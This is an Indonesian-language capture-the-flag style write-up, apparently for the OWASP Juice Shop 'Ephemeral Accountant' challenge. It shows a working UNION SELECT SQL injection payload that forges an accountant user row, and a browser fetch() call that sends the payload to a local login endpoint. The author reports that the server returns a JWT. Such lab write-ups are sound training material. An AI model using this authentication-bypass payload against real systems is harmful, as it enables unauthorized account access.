
## Penyelesaian Tantangan: Ephemeral Accountant

### Deskripsi Tantangan
Tantangan ini menuntut saya untuk masuk sebagai pengguna yang tidak ada (`acc0unt4nt@juice-sh.op`) tanpa mendaftarkannya terlebih dahulu. Pengguna ini harus "diciptakan" secara sementara hanya selama proses login.

### Strategi dan Eksekusi Serangan

#### Analisis Fungsionalitas
Saya mengidentifikasi endpoint `POST /rest/user/login` sebagai target. Tujuan saya adalah menyuntikkan SQL melalui body JSON dari permintaan ini.

#### Menyusun Payload SQL Injection
Karena akun tidak ada, saya menggunakan strategi `UNION SELECT` SQL Injection untuk membuat baris data pengguna palsu secara temporer. Payload ini dirancang untuk meniru struktur data pengguna yang sah, lengkap dengan email, password, dan role yang diperlukan.

Berikut adalah payload yang digunakan:

```json
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```

#### Eksekusi Serangan dengan Konsol Peramban
saya menggunakan fungsi `fetch` di console. Metode ini efektif karena dapat menangani objek JSON dengan sempurna.

Kode yang berhasil:

```javascript
fetch('http://127.0.0.1:3000/rest/user/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
        "password": "test1234"
    })
});
```

### Analisis Hasil
Serangan SQL Injection ini berhasil menciptakan data pengguna sementara selama proses login berlangsung. Aplikasi mengolah data ini seolah-olah berasal dari database yang valid, dan memberikan token JWT yang menandakan keberhasilan login. Hal ini menunjukkan kerentanan serius dalam mekanisme otentikasi.

### Bukti 
<img width="1861" height="958" alt="Screenshot 2025-09-09 225759" src="https://github.com/user-attachments/assets/d3dee9ea-7b12-4940-a7d1-2b78430f6509" />

